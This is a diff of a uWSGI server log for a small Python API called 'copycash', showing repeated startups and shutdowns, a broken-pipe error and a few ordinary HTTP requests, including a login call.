-detected binary path: /home/tallys_prado/copycash/api/copycashenv/bin/uwsgi
-!!! no internal routing support, rebuild with pcre support !!!
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
-*** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x559156c28f80
-your server socket listen backlog is limited to 0 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437424 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x559156c28f80 pid: 1250 (default app)
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 1250)
-spawned uWSGI worker 1 (pid: 1255, cores: 1)
-spawned uWSGI worker 2 (pid: 1256, cores: 1)
-spawned uWSGI worker 3 (pid: 1257, cores: 1)
-spawned uWSGI worker 4 (pid: 1258, cores: 1)
-spawned uWSGI worker 5 (pid: 1259, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 04:08:00 2021] ***
-compiled with version: 8.3.0 on 08 February 2021 21:53:20
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /home/tallys_prado/copycash/api/copycashenv/bin/uwsgi
-!!! no internal routing support, rebuild with pcre support !!!
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
-*** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x564650859f80
-your server socket listen backlog is limited to 0 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437424 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x564650859f80 pid: 1276 (default app)
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 1276)
-spawned uWSGI worker 1 (pid: 1279, cores: 1)
-spawned uWSGI worker 2 (pid: 1280, cores: 1)
-spawned uWSGI worker 3 (pid: 1281, cores: 1)
-spawned uWSGI worker 4 (pid: 1282, cores: 1)
-spawned uWSGI worker 5 (pid: 1283, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 04:09:29 2021] ***
-compiled with version: 8.3.0 on 08 February 2021 21:53:20
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /home/tallys_prado/copycash/api/copycashenv/bin/uwsgi
-!!! no internal routing support, rebuild with pcre support !!!
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
-*** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x561240a19f80
-your server socket listen backlog is limited to 0 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437424 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x561240a19f80 pid: 1367 (default app)
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 1367)
-spawned uWSGI worker 1 (pid: 1371, cores: 1)
-spawned uWSGI worker 2 (pid: 1372, cores: 1)
-spawned uWSGI worker 3 (pid: 1373, cores: 1)
-spawned uWSGI worker 4 (pid: 1374, cores: 1)
-spawned uWSGI worker 5 (pid: 1375, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Feb 19 04:09:53 2021] ***
-compiled with version: 8.3.0 on 08 February 2021 21:53:20
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /home/tallys_prado/copycash/api/copycashenv/bin/uwsgi
-!!! no internal routing support, rebuild with pcre support !!!
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
-*** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x560d54f3af80
-your server socket listen backlog is limited to 0 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437424 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x560d54f3af80 pid: 1391 (default app)
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 1391)
-spawned uWSGI worker 1 (pid: 1394, cores: 1)
-spawned uWSGI worker 2 (pid: 1395, cores: 1)
-spawned uWSGI worker 3 (pid: 1396, cores: 1)
-spawned uWSGI worker 4 (pid: 1397, cores: 1)
-spawned uWSGI worker 5 (pid: 1398, cores: 1)
-[pid: 1397|app: 0|req: 1/1] 177.37.194.64 () {56 vars in 1019 bytes} [Fri Feb 19 04:09:54 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (2 switches on core 0)
-[pid: 1398|app: 0|req: 1/2] 177.37.194.64 () {56 vars in 973 bytes} [Fri Feb 19 04:09:55 2021] GET /favicon.ico => generated 232 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 144 bytes (1 switches on core 0)
-[pid: 1398|app: 0|req: 2/3] 177.37.194.64 () {54 vars in 988 bytes} [Fri Feb 19 04:10:04 2021] GET / => generated 34 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 136 bytes (2 switches on core 0)
+spawned uWSGI master process (pid: 9947)
+spawned uWSGI worker 1 (pid: 9950, cores: 1)
+spawned uWSGI worker 2 (pid: 9951, cores: 1)
+spawned uWSGI worker 3 (pid: 9952, cores: 1)
+spawned uWSGI worker 4 (pid: 9953, cores: 1)
+spawned uWSGI worker 5 (pid: 9954, cores: 1)
+[pid: 9952|app: 0|req: 1/1] 177.37.194.64 () {42 vars in 680 bytes} [Sat Feb 20 06:47:09 2021] GET / => generated 22 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+Sat Feb 20 06:47:09 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /favicon.ico (ip 177.37.194.64) !!!
+Sat Feb 20 06:47:09 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET /favicon.ico (177.37.194.64)
+OSError: write error
+[pid: 9950|app: 0|req: 1/2] 177.37.194.64 () {42 vars in 644 bytes} [Sat Feb 20 06:47:09 2021] GET /favicon.ico => generated 0 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 0 bytes (0 switches on core 0)
+[pid: 9952|app: 0|req: 2/3] 177.37.194.64 () {48 vars in 777 bytes} [Sat Feb 20 06:47:18 2021] OPTIONS /api/login => generated 0 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 315 bytes (1 switches on core 0)
+tallys.prado teste
+[pid: 9954|app: 0|req: 1/4] 177.37.194.64 () {50 vars in 770 bytes} [Sat Feb 20 06:47:18 2021] POST /api/login => generated 287 bytes in 51 msecs (HTTP/1.1 200) 4 headers in 138 bytes (1 switches on core 0)
+[pid: 9952|app: 0|req: 3/5] 189.126.64.78 () {32 vars in 462 bytes} [Sat Feb 20 06:47:52 2021] GET / => generated 22 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
